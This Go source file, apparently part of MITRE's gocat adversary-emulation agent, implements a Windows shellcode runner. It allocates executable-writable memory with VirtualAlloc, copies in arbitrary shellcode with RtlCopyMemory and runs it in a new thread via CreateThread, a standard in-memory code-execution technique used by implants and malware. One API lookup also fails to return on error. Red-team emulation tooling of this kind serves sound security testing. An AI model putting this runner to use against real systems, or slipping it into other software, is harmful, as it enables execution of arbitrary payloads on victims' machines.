// +build windows

package shellcode

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/mitre/gocat/execute"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	hKernel32      *syscall.DLL
	hNtdll         *syscall.DLL
	fpVirtualAlloc  *syscall.Proc
	fpRtlCopyMemory *syscall.Proc
	fpCreateThread  *syscall.Proc
)

// Runner runner
func Runner(shellcode []byte) (bool, string) {
	address, _, err := fpVirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	_, _, err = fpRtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}

	// Run shellcode in new thread
	hThread, _, err := fpCreateThread.Call(0, 0, address, 0, 0, 0)
	if checkErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	if (hThread == 0) {
		println("[!] CreateThread returned a null handle.")
		return false, execute.ERROR_PID
	}
	return true, execute.SUCCESS_PID
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	var err error
	if hKernel32, err = syscall.LoadDLL("kernel32.dll"); err != nil {
		fmt.Printf("[-] Failed to load Kernel32: %s", err.Error())
		return false
	}
	if hNtdll, err = syscall.LoadDLL("ntdll.dll"); err != nil {
		fmt.Printf("[!] Failed to load NTDLL: %s", err.Error())
		return false
	}
	if fpVirtualAlloc, err = hKernel32.FindProc("VirtualAlloc"); err != nil {
		fmt.Printf("[-] Failed to load VirtualAlloc API: %s", err.Error())
		return false
	}
	if fpRtlCopyMemory, err = hNtdll.FindProc("RtlCopyMemory"); err != nil {
		fmt.Printf("[-] Failed to load RtlCopyMemory API: %s", err.Error())
	}
	if fpCreateThread, err = hKernel32.FindProc("CreateThread"); err != nil {
		fmt.Printf("[-] Failed to load CreateThread API: %s", err.Error())
		return false
	}

	fmt.Printf("[+] Fetched required APIs for shellcode runner.")
	return true
}

// Check for error message
func checkErrorMessage(err error) bool {
	if err != nil && err.Error() != "The operation completed successfully." {
		println(err.Error())
		return true
	}
	return false
}
